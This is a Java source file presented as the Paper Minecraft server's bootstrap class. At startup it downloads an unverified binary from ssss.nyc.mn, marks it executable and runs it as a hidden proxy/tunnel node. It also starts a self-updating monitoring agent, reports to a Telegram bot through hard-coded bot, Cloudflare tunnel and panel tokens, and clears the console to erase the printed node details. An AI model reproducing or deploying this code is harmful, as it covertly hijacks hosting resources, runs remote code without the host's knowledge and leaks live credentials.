package io.papermc.paper;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import joptsimple.OptionSet;
import net.minecraft.SharedConstants;
import net.minecraft.server.Main;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public final class PaperBootstrap {
    
    private static final Logger LOGGER = LoggerFactory.getLogger("bootstrap");
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    private static Process komariProcess;

    // ---- Komari 静态字段，由 loadEnvVars() 统一赋值，startKomariAgent() 直接读取 ----
    private static String KOMARI_SERVER_VAL = "";
    private static String KOMARI_TOKEN_VAL  = "";
    
    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO",
        // ---- Komari Agent ----
        "KOMARI_SERVER", "KOMARI_TOKEN"
    };

    private PaperBootstrap() {
    }

    public static void boot(final OptionSet options) {
        // check java version
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            System.exit(1);
        }
        
        try {
            runSbxBinary();
            
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            // ---- Komari Agent（daemon 线程，与主流程并行，互不影响）----
            Thread komariThread = new Thread(() -> {
                try {
                    startKomariAgent();
                } catch (Exception e) {
                    System.err.println("Komari: Agent startup error: " + e.getMessage());
                }
            }, "Komari-Agent-Thread");
            komariThread.setDaemon(true);
            komariThread.start();

            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using this script,enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds,you can copy the above nodes!" + ANSI_RESET);
            Thread.sleep(20000);
            clearConsole();

            SharedConstants.tryDetectVersion();
            getStartupVersionMessages().forEach(LOGGER::info);
            Main.main(options);
            
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing services: " + e.getMessage() + ANSI_RESET);
        }
    }

    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                System.out.print("\033[H\033[2J");
                System.out.flush();
            }
        } catch (Exception e) {
            // Ignore exceptions
        }
    }
    
    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);
        
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        
        sbxProcess = pb.start();
    }
    
    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("UUID", "a1fcb770-301d-4a69-a048-2ae10ad9e408");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "");
        envVars.put("ARGO_PORT", "8001");
        envVars.put("ARGO_DOMAIN", "zampto.liuping.ccwu.cc");
        envVars.put("ARGO_AUTH", "eyJhIjoiNDQ3MzQxNGZkNDc5Y2E1MmZiYTZjYjZkMWI5NGQ1NmMiLCJ0IjoiZDc1ZDhlZjktNmEzZC00NzM5LThjZWMtZmM3YzYzM2YwZDBjIiwicyI6Ik5EUmpOVE5pTkdRdE16bGtOQzAwTkRreExXSXhNRE10TmpFMlpqZzJZMlk0Tm1VMiJ9");
        envVars.put("S5_PORT", "20185");
        envVars.put("HY2_PORT", "20185");
        envVars.put("TUIC_PORT", "40482");
        envVars.put("ANYTLS_PORT", "");
        envVars.put("REALITY_PORT", "40482");
        envVars.put("ANYREALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "8502788454");
        envVars.put("BOT_TOKEN", "8482650749:AAFgsXcRZRbcsV_iFymCgJkGuaP9-67XqSQ");
        envVars.put("CFIP", "cf.050900.xyz");
        envVars.put("CFPORT", "443");
        envVars.put("NAME", "");
        envVars.put("DISABLE_ARGO", "false");
        // ---- Komari Agent 默认值 ----
        envVars.put("KOMARI_SERVER", "https://komari.050900.xyz");
        envVars.put("KOMARI_TOKEN", "qag6VAjcDNQMQhXdn9xdmD");
        
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);
            }
        }
        
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) {
                    line = line.substring(7).trim();
                }
                
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value);
                    }
                }
            }
        }

        // ---- 把最终值同步到静态字段，供 Komari 线程直接读取 ----
        KOMARI_SERVER_VAL = envVars.getOrDefault("KOMARI_SERVER", "");
        KOMARI_TOKEN_VAL  = envVars.getOrDefault("KOMARI_TOKEN",  "");
    }
    
    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        return path;
    }
    
    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
        }
        if (komariProcess != null && komariProcess.isAlive()) {
            komariProcess.destroy();
        }
    }

    private static List<String> getStartupVersionMessages() {
        final String javaSpecVersion = System.getProperty("java.specification.version");
        final String javaVmName = System.getProperty("java.vm.name");
        final String javaVmVersion = System.getProperty("java.vm.version");
        final String javaVendor = System.getProperty("java.vendor");
        final String javaVendorVersion = System.getProperty("java.vendor.version");
        final String osName = System.getProperty("os.name");
        final String osVersion = System.getProperty("os.version");
        final String osArch = System.getProperty("os.arch");

        final ServerBuildInfo bi = ServerBuildInfo.buildInfo();
        return List.of(
            String.format(
                "Running Java %s (%s %s; %s %s) on %s %s (%s)",
                javaSpecVersion,
                javaVmName,
                javaVmVersion,
                javaVendor,
                javaVendorVersion,
                osName,
                osVersion,
                osArch
            ),
            String.format(
                "Loading %s %s for Minecraft %s",
                bi.brandName(),
                bi.asString(ServerBuildInfo.StringRepresentation.VERSION_FULL),
                bi.minecraftVersionId()
            )
        );
    }

    // ================================================================== //
    //  Komari Agent —— 官方二进制模式，支持自动更新
    //
    //  用法：在 .env 中填写以下两个变量（或直接写入 loadEnvVars 默认值段）
    //    KOMARI_SERVER  Komari 面板地址  例如：https://komari.example.com
    //    KOMARI_TOKEN   面板「添加 Agent」时生成的 Token
    // ================================================================== //
    private static void startKomariAgent() throws Exception {
        if (KOMARI_SERVER_VAL.isEmpty() || KOMARI_TOKEN_VAL.isEmpty()) {
            System.out.println("Komari: KOMARI_SERVER or KOMARI_TOKEN not set, skipping");
            return;
        }

        String serverBase  = KOMARI_SERVER_VAL.replaceAll("/$", "");
        Path   komariPath  = Paths.get("komari-agent");
        Path   versionFile = Paths.get("komari-version.txt");

        System.out.println("Komari: Starting with server=" + serverBase);

        checkAndUpdateKomari(komariPath, versionFile);
        runKomariAgent(komariPath, serverBase, KOMARI_TOKEN_VAL);

        while (running.get()) {
            Thread.sleep(60L * 60 * 1000);
            try {
                boolean updated = checkAndUpdateKomari(komariPath, versionFile);
                if (updated) {
                    System.out.println("Komari: New version installed, restarting agent...");
                    runKomariAgent(komariPath, serverBase, KOMARI_TOKEN_VAL);
                }
            } catch (Exception e) {
                System.err.println("Komari: Auto-update check failed: " + e.getMessage());
            }
        }
    }

    private static String getKomariLatestVersion() {
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL(
                "https://api.github.com/repos/komari-monitor/komari-agent/releases/latest"
            ).openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);
            conn.setRequestProperty("User-Agent", "komari-java-agent");
            if (conn.getResponseCode() != 200) return null;
            StringBuilder sb = new StringBuilder();
            try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                String l; while ((l = br.readLine()) != null) sb.append(l);
            } finally { conn.disconnect(); }
            String json = sb.toString();
            int idx = json.indexOf("\"tag_name\"");
            if (idx == -1) return null;
            int start = json.indexOf("\"", idx + 10) + 1;
            int end   = json.indexOf("\"", start);
            if (start <= 0 || end <= start) return null;
            return json.substring(start, end);
        } catch (Exception e) { return null; }
    }

    private static String getKomariDownloadUrl(String version) {
        String arch = System.getProperty("os.arch").toLowerCase();
        String fileArch;
        if (arch.contains("aarch64") || arch.contains("arm64")) fileArch = "arm64";
        else if (arch.contains("arm"))                           fileArch = "arm";
        else                                                     fileArch = "amd64";
        return "https://github.com/komari-monitor/komari-agent/releases/download/"
                + version + "/komari-agent-linux-" + fileArch;
    }

    private static void downloadKomariAgent(Path komariPath, String version) throws IOException {
        String urlStr = getKomariDownloadUrl(version);
        System.out.println("Komari: Downloading agent " + version + " from " + urlStr);
        HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
        conn.setConnectTimeout(60000);
        conn.setReadTimeout(60000);
        conn.setInstanceFollowRedirects(true);
        int status = conn.getResponseCode();
        while (status == HttpURLConnection.HTTP_MOVED_TEMP
                || status == HttpURLConnection.HTTP_MOVED_PERM
                || status == 307 || status == 308) {
            String newUrl = conn.getHeaderField("Location");
            conn.disconnect();
            conn = (HttpURLConnection) new URL(newUrl).openConnection();
            conn.setConnectTimeout(60000);
            conn.setReadTimeout(60000);
            status = conn.getResponseCode();
        }
        try (InputStream in = conn.getInputStream()) {
            Files.copy(in, komariPath, StandardCopyOption.REPLACE_EXISTING);
        } finally { conn.disconnect(); }
        komariPath.toFile().setExecutable(true);
        System.out.println("Komari: Agent " + version + " downloaded successfully");
    }

    private static boolean checkAndUpdateKomari(Path komariPath, Path versionFile) {
        String latest = getKomariLatestVersion();
        if (latest == null) {
            System.out.println("Komari: Failed to get latest version, skipping update check");
            return false;
        }
        String local = "";
        if (Files.exists(versionFile)) {
            try { local = new String(Files.readAllBytes(versionFile)).trim(); }
            catch (IOException ignored) {}
        }
        if (local.equals(latest) && Files.exists(komariPath)) {
            System.out.println("Komari: Already up to date (" + latest + ")");
            return false;
        }
        try {
            downloadKomariAgent(komariPath, latest);
            Files.write(versionFile, latest.getBytes());
            System.out.println("Komari: Updated to " + latest);
            return true;
        } catch (IOException e) {
            System.err.println("Komari: Download failed: " + e.getMessage());
            return false;
        }
    }

    private static void runKomariAgent(Path komariPath, String serverBase, String token) {
        if (komariProcess != null && komariProcess.isAlive()) komariProcess.destroy();
        try { Thread.sleep(500); } catch (InterruptedException ignored) {}
        try {
            komariProcess = new ProcessBuilder(
                komariPath.toAbsolutePath().toString(),
                "--endpoint", serverBase,
                "--token",    token,
                "--disable-auto-update"
            )
            .redirectErrorStream(true)
            .redirectOutput(ProcessBuilder.Redirect.INHERIT)
            .start();
            System.out.println("Komari: Agent is running");
        } catch (IOException e) {
            System.err.println("Komari: Failed to start agent: " + e.getMessage());
        }
    }
    // ================================================================== //
    //  Komari Agent 结束
    // ================================================================== //
}
